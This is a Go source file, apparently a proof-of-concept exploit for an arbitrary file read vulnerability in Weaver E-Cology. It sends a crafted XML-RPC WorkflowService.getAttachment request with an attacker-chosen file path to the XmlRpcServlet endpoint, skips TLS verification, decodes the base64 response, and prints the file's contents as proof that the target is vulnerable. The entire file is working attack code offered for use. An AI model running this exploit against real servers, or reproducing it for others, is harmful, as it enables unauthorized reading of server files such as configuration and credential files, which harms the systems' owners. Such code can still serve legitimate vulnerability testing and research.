package poc

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
	"time"
)

func XmlRpcServlet(target string, file string) {
	url := strings.TrimRight(target, "/")
	data := "<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodCall>\n<methodName>WorkflowService.getAttachment</methodName>\n<params><param><value><string>" + fmt.Sprintf("%s", file) + "</string>\n</value></param></params></methodCall>"
	reqconf, err := http.NewRequest("POST", url+"/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet", bytes.NewBufferString(data))
	if err != nil {
		log.Println("[-] 请求异常:", err)
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}
	responseconf, err := client.Do(reqconf)
	if err != nil {
		log.Println("[-] 请求失败:", err)
	}
	defer responseconf.Body.Close()

	// 读取响应内容
	respconfBody, err := io.ReadAll(responseconf.Body)

	startTag := "<base64>"
	endTag := "</base64>"
	startIndex := strings.Index(string(respconfBody), startTag) + len(startTag)
	endIndex := strings.Index(string(respconfBody), endTag)

	if startIndex == -1 || endIndex == -1 {
		fmt.Println("Base64 content not found")
		return
	}

	base64Content := string(respconfBody)[startIndex:endIndex]

	// 解码 base64
	decodedBytes, err := base64.StdEncoding.DecodeString(base64Content)
	if err != nil {
		fmt.Println("Base64 decoding error:", err)
		return
	}
	decodedString := string(decodedBytes)

	tag := regexp.MustCompile("methodResponse").MatchString(string(respconfBody))
	if responseconf.StatusCode == http.StatusOK && tag {
		log.Println("[+] 存在E-Cology 任意文件读取漏洞")
		log.Println("[+] 文件内容：\n" + decodedString)
	} else {
		log.Println("[-] 不存在E-Cology 任意文件读取漏洞")
	}
}
